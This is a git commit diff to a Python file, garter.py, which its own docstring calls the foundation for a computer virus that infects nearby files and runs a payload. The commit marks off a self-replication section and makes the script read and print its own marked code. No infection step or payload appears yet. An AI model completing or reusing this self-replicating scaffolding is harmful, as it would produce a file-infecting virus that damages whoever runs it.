7c9283367192954f2d5d1249c74dc3a55b7f446a
Zgell <zgellner2001@gmail.com>
2020-10-06 08:21:21 -0600

    Rigidly defined the self-replicating area of the code

--- garter.py
+++ garter.py
@@ -5,6 +5,11 @@ A simple and harmless foundation for a Python-based computer virus capable of
 infecting nearby files and executing a specific payload.
 ==============================================================================
 '''
+
+
+
+### REPLICATION START ###
+# Self-Replication Section
 import os, glob
 
 selfname = os.path.basename(__file__)
@@ -18,13 +23,20 @@ targetfile = f.readlines()
 f2 = open(selfname, 'r')
 selffile = f2.readlines()
 
+index_start = selffile.index('### REPLICATION START ###\n')
+index_end = selffile.index('### REPLICATION END ###\n')
+# Executed Payload Section
+### REPLICATION END ###
+
+
+
+'''
 for line in targetfile:
     # Since each line has '\n' character, remove it
     print(line.replace('\n', ''))
 
 for line in selffile:
 	print(line.replace('\n', ''))
+'''
 
-print(selfname)
-print(targets)
-print(targetfile)
+print(selffile[index_start:index_end])
